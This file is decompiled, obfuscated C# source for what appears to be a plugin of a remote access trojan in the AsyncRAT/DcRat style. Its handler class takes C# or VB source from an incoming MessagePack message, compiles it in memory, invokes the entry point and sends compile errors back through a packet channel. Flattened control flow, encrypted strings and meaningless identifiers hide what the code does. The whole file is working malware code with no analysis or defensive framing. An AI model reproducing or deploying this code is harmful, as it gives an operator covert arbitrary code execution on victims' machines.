using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Plugin;
using UY3BiEArlp6B4GPt9k;

namespace Miscellaneous.Handler;

public class HandlerExecuteDotNetCode
{
	private Dictionary<string, string> providerOptions;

	internal static HandlerExecuteDotNetCode RCwLPljRLSKVC8E89m;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandlerExecuteDotNetCode(MsgPack unpack_msgpack)
	{
		unlA3pGyV0vkmdYpJF();
		providerOptions = new Dictionary<string, string> { 
		{
			(string)z4cY5oruptASM37bYG(0),
			(string)z4cY5oruptASM37bYG(34)
		} };
		base._002Ector();
		int num = 5;
		string asString = default(string);
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			case 5:
				asString = ((MsgPack)cUhyegfRsS5BXOxU7u(unpack_msgpack, z4cY5oruptASM37bYG(46))).AsString;
				num = 1;
				if (0 == 0)
				{
					break;
				}
				goto IL_0049;
			case 7:
				return;
			case 2:
				if (!rDxPLNdvaVlncw197l(asString, z4cY5oruptASM37bYG(62), RbXy5yvn4JjKpY18qt.W8K8WSOGF))
				{
					num = 0;
					if (0 == 0)
					{
						break;
					}
					goto IL_0049;
				}
				Compiler(new CSharpCodeProvider(providerOptions), (string)WIPPfsIqTAxGipihbd(cUhyegfRsS5BXOxU7u(unpack_msgpack, z4cY5oruptASM37bYG(86))), (string[])z8lrl2aYeu92PkIXLC(WIPPfsIqTAxGipihbd(cUhyegfRsS5BXOxU7u(unpack_msgpack, z4cY5oruptASM37bYG(98))), new string[1] { nCP5vtxT3QjsSeuiK3.xuCtsHmOK(120) }, StringSplitOptions.RemoveEmptyEntries, sVqrYIHSAGtilssdZ7.Q34mCyqJJ));
				num = 4;
				break;
			case 6:
				return;
			default:
				if (!rDxPLNdvaVlncw197l(asString, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(70), RbXy5yvn4JjKpY18qt.W8K8WSOGF))
				{
					return;
				}
				num = 3;
				break;
			case 4:
				return;
			case 3:
				Compiler(new VBCodeProvider(providerOptions), ((MsgPack)cUhyegfRsS5BXOxU7u(unpack_msgpack, z4cY5oruptASM37bYG(86))).AsString, (string[])z8lrl2aYeu92PkIXLC(((MsgPack)cUhyegfRsS5BXOxU7u(unpack_msgpack, z4cY5oruptASM37bYG(98))).AsString, new string[1] { (string)z4cY5oruptASM37bYG(120) }, StringSplitOptions.RemoveEmptyEntries, sVqrYIHSAGtilssdZ7.Q34mCyqJJ));
				num = 7;
				if (true)
				{
					break;
				}
				goto IL_0049;
			case 1:
				{
					if (asString == null)
					{
						return;
					}
					num = 2;
					break;
				}
				IL_0049:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
	{
		switch (1)
		{
		case 1:
			try
			{
				new Dictionary<string, string>().Add(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(0), (string)z4cY5oruptASM37bYG(34));
				int num = 8;
				MethodInfo methodInfo = default(MethodInfo);
				object[] array = default(object[]);
				object obj = default(object);
				int num2 = default(int);
				IEnumerator enumerator = default(IEnumerator);
				CompilerResults compilerResults = default(CompilerResults);
				CompilerParameters compilerParameters2 = default(CompilerParameters);
				string text = default(string);
				CompilerError compilerError = default(CompilerError);
				int num6 = default(int);
				while (true)
				{
					switch (num)
					{
					case 6:
						if (((Array)cuL0ZFmujyoiP173lM(methodInfo, hirSKLiImoj6ibIrtW.j6kcM0hfn)).Length == 0)
						{
							num = 12;
							break;
						}
						goto case 2;
					case 5:
						array = new object[1];
						num = 6;
						if (ha3jkEVf2uahw8S8gs() != null)
						{
							num = 4;
						}
						break;
					case 2:
						VEkAUdc8dpjsuJE3YE(methodInfo, obj, array);
						num2 = 9;
						goto IL_004f;
					case 12:
						array = null;
						num = 2;
						if (!xiRVjnsacmVL5YXOCH())
						{
							num = 1;
						}
						break;
					case 4:
						enumerator = (IEnumerator)WOUQVRqkx0B5r1XhG5(yvSlx3bRrbgPyTeE4y.cnL5MhNQE(compilerResults, yvSlx3bRrbgPyTeE4y.K924JfWp7), ELn3YwR7NPyDvrv2ms.HJvjBUWwb);
						num2 = 7;
						goto IL_004f;
					case 1:
						compilerResults = (CompilerResults)MrKpMC04DetqEgAm8t(codeDomProvider, compilerParameters2, new string[1] { source }, hTXMI1sWbxsTmNqsCT.clMt4N5nR);
						num = 11;
						break;
					case 10:
					{
						CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies);
						mCK9e03tZfKTQgjIRn(compilerParameters, true, IFtgihx0iA5oNXHUy6.LjkZ2foiU);
						mCK9e03tZfKTQgjIRn(compilerParameters, true, IFtgihx0iA5oNXHUy6.dsUgJwiE9);
						qwsHh8974Vuu4mPkJX(compilerParameters, text, kdcg46TA0IYwy3FDnZ.omAoNH7g2);
						mCK9e03tZfKTQgjIRn(compilerParameters, false, IFtgihx0iA5oNXHUy6.u8rQPJTLa);
						mCK9e03tZfKTQgjIRn(compilerParameters, false, IFtgihx0iA5oNXHUy6.KZ8GX4tYW);
						compilerParameters2 = compilerParameters;
						num = 1;
						if (ha3jkEVf2uahw8S8gs() != null)
						{
							num = 1;
						}
						break;
					}
					case 7:
						try
						{
							while (true)
							{
								int num3;
								if (!usYj67JBV1NBBsby7v.cnL5MhNQE(enumerator, usYj67JBV1NBBsby7v.YOxXyvBtx))
								{
									num3 = 4;
									goto IL_01ce;
								}
								goto IL_01f0;
								IL_01ce:
								int num4 = num3;
								goto IL_01d2;
								IL_01f0:
								compilerError = (CompilerError)sXJEHnPj6dhyXkDjLy.cnL5MhNQE(enumerator, sXJEHnPj6dhyXkDjLy.MRxIqeHpj);
								num4 = 2;
								goto IL_01d2;
								IL_01d2:
								switch (num4)
								{
								case 2:
									goto IL_020d;
								case 1:
									continue;
								case 3:
									return;
								case 4:
									return;
								}
								goto IL_01f0;
								IL_020d:
								Packet.Error((string)GeHCmeAhv6b0eTMynO(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(214), zVYIKQMSYiXDLtRkIF.cnL5MhNQE(compilerError, zVYIKQMSYiXDLtRkIF.Bpi0emKir), sFgkBrQQAkgOO6ColW(compilerError, oX7Qj6yJIobF4eKyjA.m8ikNuW6h), gVsxfcC4KHRCJD0wiC.of1DiRliF));
								num3 = 3;
								goto IL_01ce;
							}
						}
						finally
						{
							IDisposable disposable = enumerator as IDisposable;
							int num5 = 1;
							if (ha3jkEVf2uahw8S8gs() != null)
							{
								goto IL_02b2;
							}
							goto IL_02b6;
							IL_02b2:
							num5 = num6;
							goto IL_02b6;
							IL_02b6:
							while (true)
							{
								switch (num5)
								{
								default:
									goto end_IL_02b6;
								case 2:
									EcnfY7ZoaPoOuhbwOp(disposable, xoRAhX7vZnAU6ouQJf.rBhN0MfTk);
									num5 = 0;
									if (ha3jkEVf2uahw8S8gs() == null)
									{
										continue;
									}
									break;
								case 1:
									if (disposable != null)
									{
										num5 = 2;
										continue;
									}
									goto end_IL_02b6;
								case 0:
									goto end_IL_02b6;
								}
								goto IL_02b2;
								continue;
								end_IL_02b6:
								break;
							}
						}
					default:
					{
						object obj2 = z7QBjKxSjwW01yRmCe(compilerResults, Fp2NGkWaeJpHyVVZjr.oC8apMoYm);
						methodInfo = (MethodInfo)JNPIflCr57xnJT0li4(obj2, NnemhX2565hv90jddR.AShBmx2av);
						obj = OFCqDk2EjpZ9hGRBwI(obj2, zVYIKQMSYiXDLtRkIF.cnL5MhNQE(methodInfo, zVYIKQMSYiXDLtRkIF.krWUD8DmR), BSeITd6G2VhHn3drr4.n15wTlMhj);
						num = 5;
						if (xiRVjnsacmVL5YXOCH())
						{
							break;
						}
						goto IL_004f;
					}
					case 8:
						text = (string)z4cY5oruptASM37bYG(126);
						num = 10;
						if (xiRVjnsacmVL5YXOCH())
						{
							break;
						}
						goto IL_004f;
					case 11:
						if (oX7Qj6yJIobF4eKyjA.cnL5MhNQE(yvSlx3bRrbgPyTeE4y.cnL5MhNQE(compilerResults, yvSlx3bRrbgPyTeE4y.K924JfWp7), oX7Qj6yJIobF4eKyjA.GEWun1o6E) <= 0)
						{
							num = 3;
							if (xiRVjnsacmVL5YXOCH())
							{
								break;
							}
							goto IL_004f;
						}
						goto case 4;
					case 9:
						return;
						IL_004f:
						num = num2;
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Bv3vVwpMiCBCDX5jn6(Uq1glgeKXZWW0nTBGB(ex, zVYIKQMSYiXDLtRkIF.N15Vrd53r));
				int num7 = 0;
				if (!xiRVjnsacmVL5YXOCH())
				{
					int num8 = default(int);
					num7 = num8;
				}
				switch (num7)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void unlA3pGyV0vkmdYpJF()
	{
		WkMgYHbfSUMGdoITRx.Mwxkyt2zf90Xh();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object z4cY5oruptASM37bYG(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object cUhyegfRsS5BXOxU7u(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool rDxPLNdvaVlncw197l(object P_0, object P_1, object P_2)
	{
		return RbXy5yvn4JjKpY18qt.cnL5MhNQE((string)P_0, (string)P_1, (RbXy5yvn4JjKpY18qt)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object WIPPfsIqTAxGipihbd(object P_0)
	{
		return ((MsgPack)P_0).AsString;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object z8lrl2aYeu92PkIXLC(object P_0, object P_1, StringSplitOptions P_2, object P_3)
	{
		return sVqrYIHSAGtilssdZ7.cnL5MhNQE(P_0, (string[])P_1, P_2, (sVqrYIHSAGtilssdZ7)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool xiRVjnsacmVL5YXOCH()
	{
		return RCwLPljRLSKVC8E89m == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandlerExecuteDotNetCode ha3jkEVf2uahw8S8gs()
	{
		return RCwLPljRLSKVC8E89m;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void mCK9e03tZfKTQgjIRn(object P_0, bool P_1, object P_2)
	{
		IFtgihx0iA5oNXHUy6.cnL5MhNQE(P_0, P_1, (IFtgihx0iA5oNXHUy6)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void qwsHh8974Vuu4mPkJX(object P_0, object P_1, object P_2)
	{
		kdcg46TA0IYwy3FDnZ.cnL5MhNQE(P_0, (string)P_1, (kdcg46TA0IYwy3FDnZ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object MrKpMC04DetqEgAm8t(object P_0, object P_1, object P_2, object P_3)
	{
		return hTXMI1sWbxsTmNqsCT.cnL5MhNQE(P_0, (CompilerParameters)P_1, (string[])P_2, (hTXMI1sWbxsTmNqsCT)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object WOUQVRqkx0B5r1XhG5(object P_0, object P_1)
	{
		return ELn3YwR7NPyDvrv2ms.cnL5MhNQE(P_0, (ELn3YwR7NPyDvrv2ms)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int sFgkBrQQAkgOO6ColW(object P_0, object P_1)
	{
		return oX7Qj6yJIobF4eKyjA.cnL5MhNQE(P_0, (oX7Qj6yJIobF4eKyjA)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object GeHCmeAhv6b0eTMynO(object P_0, object P_1, object P_2, object P_3)
	{
		return gVsxfcC4KHRCJD0wiC.cnL5MhNQE((string)P_0, P_1, P_2, (gVsxfcC4KHRCJD0wiC)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void EcnfY7ZoaPoOuhbwOp(object P_0, object P_1)
	{
		xoRAhX7vZnAU6ouQJf.cnL5MhNQE(P_0, (xoRAhX7vZnAU6ouQJf)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object z7QBjKxSjwW01yRmCe(object P_0, object P_1)
	{
		return Fp2NGkWaeJpHyVVZjr.cnL5MhNQE(P_0, (Fp2NGkWaeJpHyVVZjr)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object JNPIflCr57xnJT0li4(object P_0, object P_1)
	{
		return NnemhX2565hv90jddR.cnL5MhNQE(P_0, (NnemhX2565hv90jddR)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object OFCqDk2EjpZ9hGRBwI(object P_0, object P_1, object P_2)
	{
		return BSeITd6G2VhHn3drr4.cnL5MhNQE(P_0, (string)P_1, (BSeITd6G2VhHn3drr4)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object cuL0ZFmujyoiP173lM(object P_0, object P_1)
	{
		return hirSKLiImoj6ibIrtW.cnL5MhNQE(P_0, (hirSKLiImoj6ibIrtW)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object VEkAUdc8dpjsuJE3YE(object P_0, object P_1, object P_2)
	{
		return ((MethodBase)P_0).Invoke(P_1, (object[])P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Uq1glgeKXZWW0nTBGB(object P_0, object P_1)
	{
		return zVYIKQMSYiXDLtRkIF.cnL5MhNQE(P_0, (zVYIKQMSYiXDLtRkIF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Bv3vVwpMiCBCDX5jn6(object P_0)
	{
		Packet.Error((string)P_0);
	}
}
